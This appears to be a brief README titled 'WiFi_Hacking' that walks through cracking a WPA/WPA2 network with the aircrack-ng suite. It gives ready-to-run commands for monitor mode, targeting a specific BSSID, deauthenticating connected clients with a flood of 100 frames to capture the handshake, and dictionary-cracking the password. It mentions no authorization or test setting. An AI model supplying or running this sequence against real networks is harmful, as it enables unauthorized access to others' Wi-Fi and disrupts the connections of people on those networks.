# WiFi_Hacking

### `airmon-ng start wlan0`
This command uses the *airmon-ng* tool to start monitor mode on the wireless interface wlan0. Monitor mode is used for capturing and analyzing Wi-Fi traffic.

### `airodump-ng mon0`
This command uses the *airodump-ng* tool to capture information about nearby wireless networks. The mon0 interface is the monitor mode interface created in the previous step.

### `airodump-ng --bssid 08:86:30:74:22:76 -c 6 --write WPAcrack mon0`
This command uses *airodump-ng* to target a wireless network with the specified BSSID (MAC address) and channel (6). It captures information about the target network and saves it to a WPAcrack file.

### `aireplay-ng --deauth 100 -a 08:86:30:74:22:76 mon0`
This command uses the *aireplay-ng* tool to send de-authentication frames to the target access point (specified by the BSSID) to force connected clients to re-authenticate. The -a option specifies the target BSSID, and -deauth 100 indicates that 100 de-authentication frames should be sent.

### `aircrack-ng WPAcrack-01.cap -w /path/to/passwd/file`
Using a dictionary attack, this command uses the *aircrack-ng* tool to attempt to crack the *WPA/WPA2* password. The *WPAcrack-01.cap* file contains the captured authentication handshake from the targeted network, and the -w option specifies the path to a file containing a list of possible passwords.
